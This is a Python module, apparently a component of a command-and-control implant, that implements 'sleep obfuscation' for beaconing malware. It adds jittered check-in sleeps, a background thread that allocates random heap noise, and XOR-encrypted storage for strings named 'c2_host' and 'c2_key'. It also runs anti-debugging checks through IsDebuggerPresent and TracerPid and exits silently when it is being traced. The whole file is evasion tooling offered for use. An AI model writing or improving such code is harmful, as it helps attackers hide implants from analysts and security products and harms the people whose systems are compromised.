"""Sleep obfuscation — heap noise, string encryption, timer-based sleep."""

import os
import time
import random
import threading
import sys
import ctypes


class SleepObfuscator:
    def __init__(self):
        self._noise_threads: list = []
        self._encrypted_strings: dict = {}
        self._active = False

    def start(self):
        self._active = True
        t = threading.Thread(target=self._noise_loop, daemon=True)
        t.start()
        self._noise_threads.append(t)

    def stop(self):
        self._active = False

    def _noise_loop(self):
        while self._active:
            size = random.randint(1024, 1024 * 1024)
            try:
                buf = bytearray(size)
                for i in range(0, min(size, 4096), 64):
                    buf[i] = random.randint(0, 255)
                del buf
            except Exception:
                pass
            time.sleep(random.uniform(2, 10))

    def encrypt_string(self, key: str, value: str) -> str:
        if key not in self._encrypted_strings:
            k = random.randint(1, 255)
            data = ''.join(chr(ord(c) ^ k) for c in value)
            self._encrypted_strings[key] = (data, k)
        return key

    def decrypt_string(self, key: str) -> str:
        entry = self._encrypted_strings.get(key)
        if entry:
            data, k = entry
            return ''.join(chr(ord(c) ^ k) for c in data)
        return ''

    def obfuscated_sleep(self, seconds: float, jitter: float = 0.3):
        j = seconds * jitter
        total = seconds + random.uniform(-j, j)
        if total < 0.1:
            total = 0.1
        segments = max(1, int(total / random.uniform(0.5, 2.0)))
        seg_time = total / segments
        for _ in range(segments):
            self._check_evasion()
            time.sleep(seg_time)

    def _check_evasion(self):
        if os.name == 'nt':
            try:
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    sys.exit(0)
            except Exception:
                pass
        else:
            try:
                with open('/proc/self/status', 'r') as f:
                    for line in f:
                        if line.startswith('TracerPid:') and line.split(':')[1].strip() != '0':
                            sys.exit(0)
            except Exception:
                pass

    def inject_delay(self, checkin_interval: float = 60, jitter_pct: float = 0.3):
        return self.obfuscated_sleep(checkin_interval, jitter_pct)


def apply_sleep_obfuscation() -> str:
    obs = SleepObfuscator()
    obs.start()
    obs.encrypt_string('c2_host', 'placeholder')
    obs.encrypt_string('c2_key', 'placeholder')
    return '[+] Sleep obfuscation active — heap noise + encrypted strings + debugger check'
